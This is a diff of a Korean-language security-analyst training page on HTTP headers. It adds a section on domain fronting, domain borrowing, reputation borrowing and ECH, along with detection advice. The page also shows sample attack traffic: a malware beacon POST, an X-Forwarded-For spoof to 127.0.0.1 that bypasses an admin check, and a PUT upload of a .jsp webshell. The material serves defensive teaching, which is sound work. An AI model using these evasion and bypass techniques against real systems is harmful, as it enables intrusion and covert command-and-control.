@@ -7546,7 +7546,7 @@
 </div>
 <h2 id="key-points">한눈에 보는 핵심 10가지<a class="headerlink" href="#key-points" title="Permanent link">¶</a></h2>
 <ol>
-<li>GET이 "이거 주세요"라면 POST는 "이거 받아 주세요". 정보를 주소가 아니라 **본문(택배 상자 안)**에 담는다.</li>
+<li>GET이 "이거 주세요"라면 POST는 "이거 받아 주세요". 정보를 주소가 아니라 <strong>본문(택배 상자 안)</strong>에 담는다.</li>
 <li>웹 서버·프록시 로그는 보통 본문을 기록하지 않는다. 하지만 <strong>로그에 없다 ≠ 아무도 못 본다</strong>. <code>http</code>면 풀 패킷 캡처에 다 보인다.</li>
 <li>악성코드와 똑똑한 웹셸은 POST를 쓴다. Referer 없음 + 앞선 GET 없음 + Base64 본문 + 일정한 주기 = 비콘.</li>
 <li>CONNECT는 프록시에 "통로를 뚫어 달라"는 요청이다. TLS 검사가 없으면 https 접속은 프록시 로그에 CONNECT 한 줄로만 남는다.</li>
@@ -7590,7 +7590,7 @@
 <p><code>http</code>(엽서)로 갔다면 풀 패킷 캡처(Full PCAP)에는 상자 안 내용까지 찍힙니다. WAF나 일부 EDR도 본문을 볼 수 있습니다. POST는 "웹 로그에 덜 남는다"일 뿐 암호화(<code>https</code>)를 대신하지 않습니다.</p>
 </div>
 <h3 id="post-abuse">공격자도 POST를 좋아한다<a class="headerlink" href="#post-abuse" title="Permanent link">¶</a></h3>
-<p>방어자에게 편한 성질은 공격자에게도 편합니다. 악성코드는 탐지를 피하려고 POST를 쓰고, 본문을 인코딩·암호화해서 발견돼도 무슨 일인지 알기 어렵게 만듭니다. 사람이 읽을 수 있어야 할 본문이 굳이 포장돼 있다면 **"왜?"**라고 물어야 합니다.</p>
+<p>방어자에게 편한 성질은 공격자에게도 편합니다. 악성코드는 탐지를 피하려고 POST를 쓰고, 본문을 인코딩·암호화해서 발견돼도 무슨 일인지 알기 어렵게 만듭니다. 사람이 읽을 수 있어야 할 본문이 굳이 포장돼 있다면 <strong>"왜?"</strong>라고 물어야 합니다.</p>
 <p><strong>장면 1: 악성코드의 POST 보고(체크인).</strong></p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>POST /gate.php HTTP/1.1
 </span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Host: update-check-service.example.org
@@ -7790,22 +7790,100 @@
 </ol>
 <h3 id="host">Host — "어느 가구를 찾아왔는지"<a class="headerlink" href="#host" title="Permanent link">¶</a></h3>
 <p>IP는 아파트 동 번호이고 한 동에 수백 가구(사이트)가 삽니다. 서버는 Host를 보고 "<code>shop.example.com</code> 손님이구나" 하고 그 사이트 파일을 내줍니다. 이를 <strong>가상 호스팅</strong>(Virtual Hosting)이라고 합니다. 분석가도 <strong>IP만으로는 어느 사이트에 갔는지 모르고 Host를 봐야 압니다.</strong> Zeek가 <code>host</code> 필드를 따로 저장하는 이유입니다.</p>
-<p><strong>[보충] 도메인 프론팅(Domain Fronting).</strong> https에는 봉투 겉면 이름(SNI)과 봉투 속 Host가 따로 있습니다. 공격자는 겉면에 믿을 만한 유명 사이트를, 속 Host에 자기 C2 사이트를 적습니다. 방화벽은 겉면만 보고 통과시키고, 같은 CDN의 해커 사이트로 편지가 전달됩니다. 주요 CDN 다수가 이 수법을 막았지만, TLS 검사가 가능한 환경이라면 <strong>SNI와 Host가 다른 요청</strong>은 확인할 가치가 있습니다.</p>
+<h4 id="domain-fronting">[보충] 도메인 프론팅과 그 진화 (2026)<a class="headerlink" href="#domain-fronting" title="Permanent link">¶</a></h4>
+<p><strong>고전 도메인 프론팅.</strong> https에는 봉투 겉면 이름(SNI)과 봉투 속 Host가 따로 있습니다. 공격자는 겉면에 믿을 만한 유명 사이트를, 속 Host에 자기 C2 사이트를 적습니다. 방화벽은 겉면만 보고 통과시키고, 같은 CDN이 속 Host를 보고 해커 사이트로 배달합니다(MITRE ATT&amp;CK T1090.004).</p>
+<p>대형 클라우드는 <strong>"겉면과 속 이름이 다르면 배달 거부"</strong>로 막았습니다. 하지만 모든 CDN이 막은 것은 아닙니다.</p>
+<table>
+<thead>
+<tr>
+<th>CDN</th>
+<th>상태</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Google, AWS CloudFront</td>
+<td>2018년 무렵부터 차단(CloudFront는 이름이 안 맞으면 <code>421</code> 오류)</td>
+</tr>
+<tr>
+<td>Microsoft Azure (Front Door/CDN)</td>
+<td>2022년 말 차단 발표, 2024년 1월부터 기존 고객에게도 적용</td>
+</tr>
+<tr>
+<td>Cloudflare</td>
+<td>2023년 측정 연구에서 프론팅 성공 사례 없음</td>
+</tr>
+<tr>
+<td>Fastly</td>
+<td>2025년 3월 테스트 시점에도 SNI·Host를 비교하지 않아 가능</td>
+</tr>
+<tr>
+<td>그 밖의 CDN</td>
+<td>2023년 연구에서 시험한 30곳 중 22곳(약 73%)이 여전히 가능(Akamai, Fastly 포함)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>변종 1: 도메인 빌리기(Domain Borrowing).</strong> 2021년 공개된 연구로, "SNI와 Host가 다르면 거부" 검사를 피하려고 나왔습니다.</p>
+<ol>
+<li>평판 좋은 <code>bigcorp.com</code>이 이미 어떤 CDN을 쓰고, 그 CDN에 <code>*.bigcorp.com</code> 와일드카드 인증서가 올라가 있음</li>
+<li>공격자가 같은 CDN에 자기 계정을 만들고, 아직 아무도 안 쓰는 <code>cdn-update.bigcorp.com</code>을 자기 사이트로 추가. 일부 CDN은 <strong>진짜 주인인지 확인하지 않았음</strong></li>
+<li>감염 PC가 접속하면 SNI와 Host가 <strong>똑같이</strong> <code>cdn-update.bigcorp.com</code>이고 인증서도 진짜 → TLS 검사 장비의 "SNI = Host?" 검사를 통과하지만, CDN은 공격자 서버로 배달</li>
+</ol>
+<p>남의 아파트 이름을 단 빈 호실을 관리실이 확인 없이 내준 셈입니다. 특정 CDN의 허점은 대부분 알려지고 고쳐졌을 가능성이 높지만, 뿌리인 <strong>"CDN·클라우드의 허술한 도메인 주인 확인"</strong>은 계속 반복됩니다. DNS의 <a href="../../dns/understanding-dns/#cname">서브도메인 탈취</a>와 같은 계열입니다.</p>
+<p><strong>변종 2: 같은 계정 안 교차, CDN 간 라우팅 결합.</strong> 정해진 기법 이름이라기보다 연구 방향입니다.</p>
+<ul>
+<li><strong>같은 계정 안 교차:</strong> 일부 CDN은 "겉면과 속 이름이 같은가"가 아니라 "둘 다 <strong>같은 고객 계정</strong> 소속인가"만 확인합니다. 그러면 그 계정 안 도메인끼리는 프론팅이 됩니다. 공격에 쓰려면 평판 좋은 도메인을 가진 고객 계정을 탈취해야 하므로 계정 탈취와 묶여서 나타납니다.</li>
+<li><strong>CDN 간 라우팅 결합:</strong> CDN 앞에 다른 CDN을 두거나 멀티 CDN 구성에서 단계마다 이름 검사가 다른 틈을 노립니다. 주로 연구 단계이고, 널리 보고된 실제 공격 사례는 확인하지 못했습니다.</li>
+</ul>
+<p><strong>[2026 현재] 실제로 더 많이 쓰이는 것.</strong> 복잡한 프론팅보다 <strong>신뢰받는 서비스 위에 자기 주소를 직접 만드는 방법</strong>이 흔합니다. 겉면과 속이 같아서 속일 필요조차 없습니다. Cloudflare Workers·Pages, Cloudflare 터널(<code>trycloudflare.com</code>), <code>*.azurefd.net</code> 같은 클라우드 무료 서브도메인, Telegram·Discord·Slack API가 그 예입니다. 2026년 2월에는 AI 챗봇(Grok, Copilot)의 웹 열람 기능을 C2 중계로 쓰는 개념 증명(PoC, 실제 공격이 아닌 시연)도 공개됐습니다. 공통점은 <strong>"평판 빌리기"</strong>이고, 도메인 프론팅은 그 여러 방법 중 하나일 뿐입니다.</p>
+<p><strong>ECH(Encrypted Client Hello): 프론팅의 "공식 버전".</strong> TLS 1.3 확장으로, DNS의 <a href="../../dns/understanding-dns/#records">HTTPS 레코드(타입 65)</a>에서 받은 공개키로 진짜 사이트 이름을 암호화합니다. 2026년 3월 <strong>RFC 9849</strong>로 정식 표준이 됐습니다.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Outer ClientHello (visible):  SNI = cloudflare-ech.com     ← cover name, shared by many sites
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>Inner ClientHello (encrypted): SNI = real-c2-site.example  ← hidden
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>IP layer (visible):           10.1.5.23  →  104.21.x.x     ← source and destination IP still visible
+</span></code></pre></div>
+<ul>
+<li>1줄: 겉면에는 여러 사이트가 함께 쓰는 공용 표지 이름(Cloudflare는 <code>cloudflare-ech.com</code>)이 보임</li>
+<li>2줄: 진짜 사이트 이름만 암호화됨</li>
+<li>3줄: 출발지·목적지 IP, 트래픽 양, 시간, 주기는 그대로 보임</li>
+</ul>
+<div class="admonition warning">
+<p class="admonition-title">[정정] ECH에 대한 흔한 오해</p>
+<ul>
+<li><strong>"출발지와 목적지를 감춘다"는 과장입니다.</strong> 숨기는 건 호스트 이름뿐입니다. 어느 아파트(IP)로 가는지는 보이고, 몇 호인지만 가려집니다.</li>
+<li><strong>프론팅의 대체라기보다 "CDN이 공식 허가한 프론팅"에 가깝습니다.</strong> 모양은 비슷하지만 CDN이 제공하는 기능이라, 공격자가 쓰려면 C2를 ECH 지원 서비스(현재 사실상 Cloudflare) 뒤에 둬야 하고, CDN 쪽에서는 진짜 이름이 다 보입니다. 숨는 대상은 중간의 회사 방화벽뿐입니다.</li>
+<li><strong>아직 보편화되지 않았습니다.</strong> 2025년 5월 Corrata 보고서 기준, 상위 100만 사이트 중 지원은 10%가 조금 안 되고(거의 전부 Cloudflare), 실제 연결 중 ECH 사용률은 약 0.06%(2025년 1~3월)였습니다. 반면 ECH 지원 사이트 중 악성·위험 사이트 비율은 약 17%로 높았고, ECH 사이트의 피싱 탐지 90% 이상이 Cloudflare 위에 있었습니다.</li>
+<li><strong>브라우저는 암호화 DNS가 있어야 ECH를 씁니다.</strong> 크롬은 보안 DNS가 켜져 있고 사이트가 ECH 키를 게시했을 때, 파이어폭스는 119 버전부터 DoH가 켜져 있을 때 작동합니다.</li>
+<li>ECH를 C2 은닉에 쓴 악성코드가 널리 보고된 사례는 확인하지 못했습니다. 다만 피싱 사이트가 이미 몰려 있으므로 앞으로 나올 가능성이 높다고 보는 것이 안전합니다.</li>
+</ul>
+</div>
+<p><strong>SOC 대응.</strong></p>
+<ul>
+<li><strong>고전 프론팅:</strong> TLS 검사가 가능하면 <strong>SNI ≠ Host</strong> 요청 탐지</li>
+<li><strong>도메인 빌리기·평판 빌리기:</strong> SNI = Host라 위 검사로는 안 잡힘 → <strong>평판 좋은 도메인의 처음 보는 서브도메인</strong>, 비콘 같은 <strong>일정한 주기</strong>, 사람이 없는 시간대 통신을 봄. 우리 도메인이 빌려지지 않도록 안 쓰는 CDN 설정과 주인 없는 CNAME 정리</li>
+<li><strong>ECH:</strong> 핵심은 <strong>ECH가 암호화 DNS 없이는 거의 쓸모없다</strong>는 점<ul>
+<li>회사 PC가 <strong>회사 DNS만 쓰도록 강제하고 외부 DoH를 차단</strong>하면 브라우저가 ECH를 켜지 않음</li>
+<li>혹시 ECH가 쓰여도 회사 DNS 로그에 <strong>어떤 도메인의 HTTPS 레코드(65)와 A 레코드를 물었는지</strong>가 남음 → 그게 진짜 사이트 이름</li>
+<li>방화벽의 ECH 차단 기능(Cisco 등 주요 제품 제공)이나 브라우저 정책으로 ECH를 끌 수 있음. 이 경우 브라우저는 일반 SNI로 다시 접속</li>
+<li>겉면 이름 <code>cloudflare-ech.com</code>은 그대로 보임(러시아가 2024년 11월 이걸로 ECH 연결을 차단한 사례가 그 증거)</li>
+<li>이름이 가려져도 IP·시간·주기·양은 보이므로 <a href="../../../../network/beaconing-c2/">비콘 탐지</a>와 EDR·Sysmon Event ID 3(어떤 프로그램이 어디로 연결했나)은 그대로 유효</li>
+</ul>
+</li>
+</ul>
 <h3 id="user-agent">User-Agent — "요청한 프로그램의 자기소개"<a class="headerlink" href="#user-agent" title="Permanent link">¶</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Mozilla/5.0                       ← historical prefix (almost every browser says this)
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>(Windows NT 10.0; Win64; x64)     ← OS: Windows, 64-bit
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>AppleWebKit/537.36 (KHTML, like Gecko)  ← rendering engine family
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>Chrome/141.0.0.0                  ← actual browser and version
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>Safari/537.36                     ← compatibility tag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>Mozilla/5.0                       ← historical prefix (almost every browser says this)
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>(Windows NT 10.0; Win64; x64)     ← OS: Windows, 64-bit
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>AppleWebKit/537.36 (KHTML, like Gecko)  ← rendering engine family
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>Chrome/141.0.0.0                  ← actual browser and version
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>Safari/537.36                     ← compatibility tag
 </span></code></pre></div>
 <p>크롬인데 <code>Mozilla</code>, <code>Safari</code>, <code>Gecko</code>가 다 들어 있는 건, 옛 웹사이트들이 특정 브라우저만 우대하자 새 브라우저들이 "저도 그거예요"라고 이름을 덧붙인 역사의 흔적입니다. 실제 정체는 <code>Chrome/141</code>입니다.</p>
 <p>수상한 User-Agent 예:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>python-requests/2.32.3
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>curl/8.9.1
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>Go-http-client/1.1
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
-</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>Mozila/5.0 (Windows NT 10.0; Win64; x64)
-</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>(empty)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>python-requests/2.32.3
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>curl/8.9.1
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>Go-http-client/1.1
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>Mozila/5.0 (Windows NT 10.0; Win64; x64)
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>(empty)
 </span></code></pre></div>
 <ul>
 <li>1~3줄: 파이썬 프로그램, <code>curl</code> 명령, Go 언어 프로그램의 기본 자기소개. 개발자·관리 스크립트면 정상일 수 있지만 일반 사무 PC에서 외부로 나가면 확인</li>
@@ -7821,9 +7899,9 @@
 <h3 id="referer">Referer — "어디서 왔는지 적힌 소개장"<a class="headerlink" href="#referer" title="Permanent link">¶</a></h3>
 <p>직전에 있던 페이지 주소입니다. 예시의 <code>Referer: https://www.google.com/</code>은 "구글 검색 결과에서 눌러서 왔어요"입니다. 철자가 <code>Referrer</code>가 아니라 <code>Referer</code>인 건 1990년대 표준 문서의 오타가 굳은 것입니다. 나중에 생긴 설정 헤더 <code>Referrer-Policy</code>는 올바른 철자라서 <strong>로그 검색 때 철자를 헷갈리면 결과가 안 나옵니다.</strong></p>
 <p>Referer는 사용자가 <strong>어떤 길로 악성 사이트에 도착했는지</strong> 되짚는 발자국입니다.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>1) GET https://outlook.office.com/mail/...                      Referer: (none)
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>2) GET http://q8z3k1vt.shady-host.eu/38104p5h2c                 Referer: https://outlook.office.com/
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>3) GET http://q8z3k1vt.shady-host.eu/PVfXBbR9WReNMmb...         Referer: http://q8z3k1vt.shady-host.eu/38104p5h2c
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>1) GET https://outlook.office.com/mail/...                      Referer: (none)
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>2) GET http://q8z3k1vt.shady-host.eu/38104p5h2c                 Referer: https://outlook.office.com/
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>3) GET http://q8z3k1vt.shady-host.eu/PVfXBbR9WReNMmb...         Referer: http://q8z3k1vt.shady-host.eu/38104p5h2c
 </span></code></pre></div>
 <ol>
 <li>웹메일을 염</li>
@@ -7848,13 +7926,13 @@
 </ul>
 <h3 id="x-forwarded-for">X-Forwarded-For — "원래 보낸 사람" 메모<a class="headerlink" href="#x-forwarded-for" title="Permanent link">¶</a></h3>
 <p>요청이 프록시나 로드밸런서(Load Balancer, 손님을 여러 서버에 나눠 주는 안내 데스크)를 거치면 서버에는 접속 IP가 전부 <strong>대리인 IP</strong>로 보입니다. 대리인이 "원래 손님은 이 IP였어요"라고 붙이는 메모가 <code>X-Forwarded-For</code>(XFF)입니다.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>Web server log -&gt; client IP: 10.0.0.5          (our load balancer)
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>Request header -&gt; X-Forwarded-For: 203.0.113.77 (the real visitor)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Web server log -&gt; client IP: 10.0.0.5          (our load balancer)
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>Request header -&gt; X-Forwarded-For: 203.0.113.77 (the real visitor)
 </span></code></pre></div>
 <p>이걸 모르면 "공격자 IP가 우리 내부 장비네?"라고 엉뚱한 결론을 냅니다. 이 메모는 대리인을 <strong>통과한 뒤</strong>에만 붙어서, 사용자 PC 쪽 캡처에는 없고 대리인 바깥쪽(서버 쪽)에서만 보입니다.</p>
 <div class="admonition warning">
 <p class="admonition-title">[주의] XFF는 손님이 거짓으로 쓸 수 있다</p>
-<p>공격자가 <code>X-Forwarded-For: 127.0.0.1</code>(서버 자기 자신)을 써 보내면 허술한 앱은 "내부 요청이네" 하고 관리자 기능을 열어 줄 수 있습니다. 대리인은 이미 적힌 값 <strong>뒤에</strong> 진짜 IP를 덧붙이므로, 믿을 수 있는 건 **우리 대리인이 마지막에 붙인 값(보통 맨 오른쪽)**입니다.</p>
+<p>공격자가 <code>X-Forwarded-For: 127.0.0.1</code>(서버 자기 자신)을 써 보내면 허술한 앱은 "내부 요청이네" 하고 관리자 기능을 열어 줄 수 있습니다. 대리인은 이미 적힌 값 <strong>뒤에</strong> 진짜 IP를 덧붙이므로, 믿을 수 있는 건 <strong>우리 대리인이 마지막에 붙인 값(보통 맨 오른쪽)</strong>입니다.</p>
 </div>
 <h3 id="header-order">헤더 순서와 용어<a class="headerlink" href="#header-order" title="Permanent link">¶</a></h3>
 <p>헤더 순서는 자유이고, 순서가 바뀌어도 서버 응답은 같아야 합니다.</p>
@@ -7872,6 +7950,7 @@
 <li><strong>User-Agent 정보량 감소.</strong> User-Agent Reduction으로 윈도우 10/11과 세부 버전 구분 불가. Client Hints(<code>Sec-CH-UA</code>)로 이동.</li>
 <li><strong>정상 트래픽의 모습 변화.</strong> OPTIONS(CORS 사전 요청), PUT, PATCH, DELETE가 REST API에서 일상적. 앱별 기준선이 중요해졌습니다.</li>
 <li><strong>용어 변화.</strong> RFC 9110 이후 "엔티티 헤더"는 공식 용어가 아님.</li>
+<li><strong>도메인 프론팅은 "평판 빌리기"로 진화.</strong> 대형 클라우드는 막았지만 일부 CDN은 아직 가능하고, SNI = Host인 도메인 빌리기, 신뢰 서비스 위 자기 주소, ECH(RFC 9849, 2026년 3월)가 등장했습니다. <a href="#domain-fronting">자세히</a></li>
 <li><strong>PUT 관련 취약점은 최근에도 나옴.</strong> 2025년 3월 Apache Tomcat CVE-2025-24813은 특정 설정에서 PUT으로 원격 코드 실행까지 이어질 수 있었고, 공개 직후 실제 공격 시도가 보고됐습니다.</li>
 </ul>
 </div>
@@ -7888,7 +7967,7 @@
 <p>먼저 직접 답해 본 뒤 해설을 펼쳐 보세요. 해설에는 실제로 자주 나오는 오답도 정리했습니다.</p>
 <h3 id="1">문제 1<a class="headerlink" href="#1" title="Permanent link">¶</a></h3>
 <p>TLS 검사를 하지 않는 회사의 프록시 로그에 이 줄이 있습니다.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>2026-10-28 09:12:44 10.1.5.23 CONNECT secure-login.example-bank.com.verify-id.net:443 200
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>2026-10-28 09:12:44 10.1.5.23 CONNECT secure-login.example-bank.com.verify-id.net:443 200
 </span></code></pre></div>
 <p>(a) 이 로그만으로 알 수 있는 것과 알 수 없는 것은? (b) 이 도메인의 진짜 주인은 누구이고 왜 의심스럽습니까?</p>
 <details class="success">
@@ -7904,13 +7983,13 @@
 </details>
 <h3 id="2">문제 2<a class="headerlink" href="#2" title="Permanent link">¶</a></h3>
 <p>직원 PC 한 대에서 아래 요청이 <strong>정확히 300초 간격으로 하루 종일</strong> 반복됩니다. 회사 PC는 모두 윈도우 11과 최신 크롬·엣지를 씁니다. 수상한 점을 최대한 많이 찾아보세요.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>POST /gate.php HTTP/1.1
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>Host: update-check-service.example.org
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>User-Agent: Mozila/5.0 (compatible; MSIE 8.0; Windows NT 6.1)
-</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>Content-Type: application/x-www-form-urlencoded
-</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>Content-Length: 53
-</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
-</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>data=aG9zdD1hZG1pbi1QQzEmb3M9V2luMTEmdXNlcj1qc21pdGg=
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>POST /gate.php HTTP/1.1
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>Host: update-check-service.example.org
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>User-Agent: Mozila/5.0 (compatible; MSIE 8.0; Windows NT 6.1)
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>Content-Type: application/x-www-form-urlencoded
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>Content-Length: 53
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>data=aG9zdD1hZG1pbi1QQzEmb3M9V2luMTEmdXNlcj1qc21pdGg=
 </span></code></pre></div>
 <details class="success">
 <summary>정답과 해설</summary>
@@ -7967,10 +8046,10 @@
 </details>
 <h3 id="3">문제 3<a class="headerlink" href="#3" title="Permanent link">¶</a></h3>
 <p>우리 웹 서버 앞에는 로드밸런서(<code>10.0.0.5</code>)가 있고, 로드밸런서는 XFF 뒤에 진짜 접속 IP를 덧붙입니다. 웹 서버 로그에서 이 요청을 발견했습니다.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>client IP:        10.0.0.5
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>request:          PUT /admin/upload/report.jsp HTTP/1.1
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>X-Forwarded-For:  127.0.0.1, 203.0.113.77
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>response status:  201
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>client IP:        10.0.0.5
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>request:          PUT /admin/upload/report.jsp HTTP/1.1
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>X-Forwarded-For:  127.0.0.1, 203.0.113.77
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>response status:  201
 </span></code></pre></div>
 <p>(a) 진짜 공격자 IP는 무엇이고, <code>127.0.0.1</code>은 왜 믿으면 안 됩니까? (b) <code>201</code>과 <code>report.jsp</code>를 함께 보면 무슨 일이 일어났을 가능성이 크고, 다음으로 무엇을 확인해야 합니까?</p>
 <details class="success">
@@ -7978,9 +8057,9 @@
 <p><strong>(a)</strong> 진짜 IP는 우리 로드밸런서가 마지막에 덧붙인 <strong><code>203.0.113.77</code></strong>. <code>127.0.0.1</code>은 공격자가 직접 써 넣은 가짜 메모입니다.</p>
 <p><strong>(b)</strong> <code>201</code> = "새로 만들었음(Created)" 성공 응답, <code>.jsp</code> = Java 웹 서버가 <strong>실행하는</strong> 파일 → <strong>웹셸 업로드 가능성이 높습니다.</strong></p>
 <p><strong>놓치기 쉬운 포인트: 두 공격이 이어져 있다.</strong> 경로가 <code>/admin/upload/</code>(관리자 전용 구역)입니다. 많은 앱은 관리자 페이지를 "서버 자신(<code>127.0.0.1</code>)이나 내부 요청만 허용"하도록 막는데, 허술한 앱은 XFF의 <strong>맨 왼쪽 값</strong>을 손님 IP로 믿습니다.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>Step 1: Fake X-Forwarded-For: 127.0.0.1   → bypass the admin-only check
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>Step 2: PUT /admin/upload/report.jsp      → upload a server-side script
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>Step 3: 201 Created                       → the file now exists on the server
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Step 1: Fake X-Forwarded-For: 127.0.0.1   → bypass the admin-only check
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>Step 2: PUT /admin/upload/report.jsp      → upload a server-side script
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>Step 3: 201 Created                       → the file now exists on the server
